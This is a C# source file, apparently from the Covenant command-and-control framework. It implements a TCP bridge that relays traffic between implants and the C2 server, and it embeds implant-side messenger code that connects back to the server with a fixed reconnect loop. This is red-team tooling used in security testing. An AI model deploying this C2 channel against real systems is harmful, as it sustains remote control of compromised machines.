using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;

namespace C2Bridge
{
    public class TcpC2Bridge : C2Bridge
    {
        // The External port for the TcpListener
        private int ExternalPort { get; }
        // A list of connected TcpClients, retrieved by their GUID value
        private readonly ConcurrentDictionary<string, TcpClient> Clients = new ConcurrentDictionary<string, TcpClient>();

        // The TcpC2Bridge constructor requires the ExternalPort to be specified in the string[] args.
        public TcpC2Bridge(BridgeConnector connector, BridgeProfile profile, string[] args) : base(connector, profile)
        {
            if (args.Length != 1 || !int.TryParse(args[0], out int ExternalPort))
            {
                Console.Error.WriteLine("Usage: TCPC2Bridge <bridge_connector_args> <external_tcp_port>");
                Environment.Exit(1); return;
            }
            this.ExternalPort = ExternalPort;
        }

        // RunAsync starts the TcpListener and continually waits for new clients
        public override async Task RunAsync(CancellationToken Token)
        {
            // Start the TcpListener
            TcpListener Listener = new TcpListener(IPAddress.Any, this.ExternalPort);
            Listener.Start();

            // Continually wait for new client
            while (!Token.IsCancellationRequested)
            {
                // Handle the client asynchronously in a new thread
                TcpClient client = await Listener.AcceptTcpClientAsync();
                _ = Task.Run(async () =>
                {
                    client.ReceiveTimeout = client.SendTimeout = 0;
                    NetworkStream stream = client.GetStream();
                    stream.ReadTimeout = stream.WriteTimeout = Timeout.Infinite;
                    while (!Token.IsCancellationRequested)
                    {
                        // Read from the implant
                        string read = await Utilities.ReadStreamAsync(stream);
                        // Write to the Covenant server
                        string guid = this.WriteToConnector(read);
                        if (guid != null)
                        {
                            // Track this GUID -> client mapping, for use within the OnReadBridge function
                            Clients.TryAdd(guid, client);
                        }
                    }
                });
            }
        }

        // OnReadBridge handles writing data to the implant from the Covenant server and gets called
        // each time data is read from the Covenant server
        protected override void OnReadBridge(object sender, BridgeConnector.ReadBridgeArgs args)
        {
            // Parse the data from the server to determine which implant this data is for
            var parsed = this.BridgeProfile.ParseRead(args.Read);
            if (parsed != null)
            {
                // Retrieve the corresponding TcpClient based upon the parsed GUID
                TcpClient client = this.Clients[parsed.Guid];
                // Write the data down to the correct implant TcpClient
                _ = Utilities.WriteStreamAsync(client.GetStream(), args.Read);
            }
        }

        // Returns the code that should be used in the BridgeProfile.BridgeMessengerCode property
        protected override string GetBridgeMessengerCode()
        {
            return this.BridgeMessengerCode;
        }

        private string BridgeMessengerCode { get; } =
@"public interface IMessenger
{
    string Hostname { get; }
    string Identifier { get; set; }
    string Authenticator { get; set; }
    string Read();
    void Write(string Message);
    void Close();
}

public class BridgeMessenger : IMessenger
{
    public string Hostname { get; } = """";
    private int Port { get; }
    public string Identifier { get; set; } = """";
    public string Authenticator { get; set; } = """";

    private string CovenantURI { get; }
    private object _tcpLock = new object();
    private string WriteFormat { get; set; }
    public TcpClient client { get; set; }
    public Stream stream { get; set; }

    public BridgeMessenger(string CovenantURI, string Identifier, string WriteFormat)
    {
        this.CovenantURI = CovenantURI;
        this.Identifier = Identifier;
        this.Hostname = CovenantURI.Split(':')[0];
        this.Port = int.Parse(CovenantURI.Split(':')[1]);
        this.WriteFormat = WriteFormat;
    }

    public string Read()
    {
        byte[] read = this.ReadBytes();
        if (read == null)
        {
            Thread.Sleep(5000);
            this.Close();
            this.Connect();
            return """";
        }
        return Encoding.UTF8.GetString(read);
    }

    public void Write(string Message)
    {
        try
        {
            lock (_tcpLock)
            {
                this.WriteBytes(Encoding.UTF8.GetBytes(Message));
                return;
            }
        }
        catch
        {
            Thread.Sleep(5000);
            this.Close();
            this.Connect();
        }
    }

    public void Close()
    {
        this.stream.Close();
        this.client.Close();
    }

    public void Connect()
    {
        try
        {
            this.client = new TcpClient();
            client.Connect(IPAddress.Parse(CovenantURI.Split(':')[0]), int.Parse(CovenantURI.Split(':')[1]));
            client.ReceiveTimeout = 0;
            client.SendTimeout = 0;
            this.stream = client.GetStream();
            this.stream.ReadTimeout = -1;
            this.stream.WriteTimeout = -1;
            this.Write(String.Format(this.WriteFormat, """", this.Identifier));
            Thread.Sleep(1000);
        }
        catch { }
    }

    private void WriteBytes(byte[] bytes)
    {
        byte[] size = new byte[4];
        size[0] = (byte)(bytes.Length >> 24);
        size[1] = (byte)(bytes.Length >> 16);
        size[2] = (byte)(bytes.Length >> 8);
        size[3] = (byte)bytes.Length;
        this.stream.Write(size, 0, size.Length);
        var writtenBytes = 0;
        while (writtenBytes < bytes.Length)
        {
            int bytesToWrite = Math.Min(bytes.Length - writtenBytes, 1024);
            this.stream.Write(bytes, writtenBytes, bytesToWrite);
            writtenBytes += bytesToWrite;
        }
    }

    private byte[] ReadBytes()
    {
        byte[] size = new byte[4];
        int totalReadBytes = 0;
        int readBytes = 0;
        do
        {
            readBytes = this.stream.Read(size, 0, size.Length);
            if (readBytes == 0) { return null; }
            totalReadBytes += readBytes;
        } while (totalReadBytes < size.Length);
        int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];

        byte[] buffer = new byte[1024];
        using (var ms = new MemoryStream())
        {
            totalReadBytes = 0;
            readBytes = 0;
            do
            {
                readBytes = this.stream.Read(buffer, 0, buffer.Length);
                if (readBytes == 0) { return null; }
                ms.Write(buffer, 0, readBytes);
                totalReadBytes += readBytes;
            } while (totalReadBytes < len);
            return ms.ToArray();
        }
    }
}";
    }
}
